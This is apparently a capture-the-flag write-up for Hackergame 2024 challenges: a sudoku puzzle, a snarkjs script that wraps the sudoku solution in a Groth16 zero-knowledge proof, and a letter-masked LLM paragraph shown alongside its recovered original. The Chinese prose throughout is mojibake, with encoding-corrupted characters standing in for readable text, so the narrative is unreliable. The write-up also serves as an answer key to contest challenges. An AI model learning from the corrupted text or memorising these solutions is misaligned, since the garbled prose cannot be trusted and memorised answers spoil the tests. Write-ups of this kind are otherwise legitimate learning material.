é›¶çŸ¥è¯†è¯æ˜ï¼Ÿè¿™ä¸ªåè¯è™½ç„¶å¬è¿‡ï¼Œä½†ä¹Ÿç®—æ˜¯æ²¡æ¥è§¦è¿‡çš„ä¸œè¥¿ï¼ŒæˆåŠŸæŠŠæˆ‘å”¬ä½äº†ï¼Œæ²¡æƒ³åˆ°å‰ä¸¤é—®å°±æ˜¯é€åˆ†ã€‚

###  æ•°ç‹¬é«˜æ‰‹

æ‰‹ç©æ‰€æœ‰éš¾åº¦å³å¯æ‹¿flagã€‚ä¹Ÿå¯ä»¥å€ŸåŠ©[è¿™ä¸ªç½‘ç«™](http://zh.sudoku.menu/info/solver.html)

### ZK é«˜æ‰‹

åŸºæœ¬ä¹Ÿæ˜¯è§£å‡ºæ•°ç‹¬å°±è¡Œï¼Œä¸è¿‡éœ€è¦æ‰“åŒ…æˆæ‰€è°“çš„é›¶çŸ¥è¯†è¯æ˜çš„ä»€ä¹ˆæ ¼å¼ã€‚

æ‰“åŒ…ä»£ç ï¼š

```js
const snarkjs = require("snarkjs");
const fs = require('fs');

const input = {
  "unsolved_grid": [
  ],
  "solved_grid": [
  ]
}

function convertNumbersToStrings(arr) {
  return arr.map(row => row.map(num => num.toString()));
}

input.unsolved_grid = convertNumbersToStrings(input.unsolved_grid);
input.solved_grid = convertNumbersToStrings(input.solved_grid);

async function generateProof() {
    const { proof, publicSignals } = await snarkjs.groth16.fullProve(input, "attachment/sudoku.wasm", "attachment/sudoku.zkey");
    fs.writeFileSync('proof.json', JSON.stringify(proof, null, 2));
    console.log('Proof written to proof.json');
    fs.writeFileSync('public.json', JSON.stringify(publicSignals, null, 2));
    console.log('public signals written to public.json');
}

generateProof().catch(err => {
    console.error("Error generating proof:", err);
});
```

æŠŠæ•°ç‹¬é¢˜ç›®å’Œè§£å†™åˆ°æœ€ä¸Šé¢çš„`input`å˜é‡é‡Œå³å¯ã€‚

## å…ˆ104ğŸ¤£ã€

## ã€Œè¡Œå§å°±ç®—æ ‡é¢˜å¯ä»¥å¾ˆé•¿ä½†æ˜¯ flag ä¸€å®šè¦çŸ­ç‚¹ã€

å¤§è¯­è¨€æ¨¡å‹ç”Ÿæˆä¸€æ®µå…³äºHackergame 2024çš„æ®µè½ï¼Œç„¶åæŠŠå…¶ä¸­çš„`hackergame`é‡Œçš„å­—æ¯å…¨æ›¿æ¢æˆäº†`x`ã€‚

æ–‡æœ¬ï¼š

```raw
In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.
```

å½“Wordleæ¥åšï¼Œ~~æˆ‘æ˜¯Wordleå¤§å¸ˆã€‚~~

è½»æ¾æ¨å‡ºåŸæ–‡ï¼š

```raw
In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
```

ç¬¬äºŒé—®æƒ³åˆ°äº†å¯èƒ½è¦å»æœè¿™ä¸ªæ¨¡å‹çš„è¯å…¸ï¼Œç„¶åå†™æ·±æœæ¥åšï¼Œä¸è¿‡å…¶ä»–é¢˜å¤ªæœ‰æ„æ€äº†ï¼Œå°±æ²¡å»å®ç°è¿™ä¸ªæƒ³æ³•ã€‚
